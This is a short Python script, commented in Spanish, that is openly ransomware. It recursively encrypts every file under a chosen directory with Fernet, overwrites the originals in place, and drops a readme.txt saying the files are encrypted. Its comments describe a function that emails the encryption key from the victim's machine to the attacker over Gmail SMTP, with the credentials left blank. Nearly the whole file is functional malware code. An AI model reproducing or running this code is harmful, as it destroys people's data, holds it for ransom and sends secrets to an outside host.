from cryptography.fernet import Fernet
import os
import smtplib
import random
import sys
#Estsa variable almacena el token del correo 
key=""
#Esta funcion envia un correo electronico de la maquina victima al atacante
def servicio(host,port,mensaje):
    server=smtplib.SMTP(host,port)
    server.starttls()
    server.login(user="@gmail.com",password=key)
    server.sendmail(from_addr="@gmail.com",to_addrs= '@gmail.com', msg=mensaje) 
    server.quit()

#Se genera una llave para que se encripte el dato 
#A su vez envia el correo electronico
def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)
        servicio("smtp.gmail.com",587,key)

def cargar_key():
    return open('key.key', 'rb').read()

def encrypt(items, key):
    f = Fernet(key)
    #for item in items:
    for a,b,c in os.walk(items):
        for s in c:

            with open(a+'/'+s, 'rb') as file:
                file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            with open(a+'/'+s, 'wb') as file:
                file.write(encrypted_data)

if __name__ == '__main__':

    ruta = input("Direccion : ")#"/home/kali/Desktop/Ataque/spam_box" 
#Ruta de windows 'C:\\Users\\'
    #items = os.listdir(ruta)
    key = cargar_key()
    encrypt(ruta,key)
    with open(ruta+'/'+'readme.txt', 'w') as file:
        file.write('Ficheros encriptados\n')
    import ventana
        
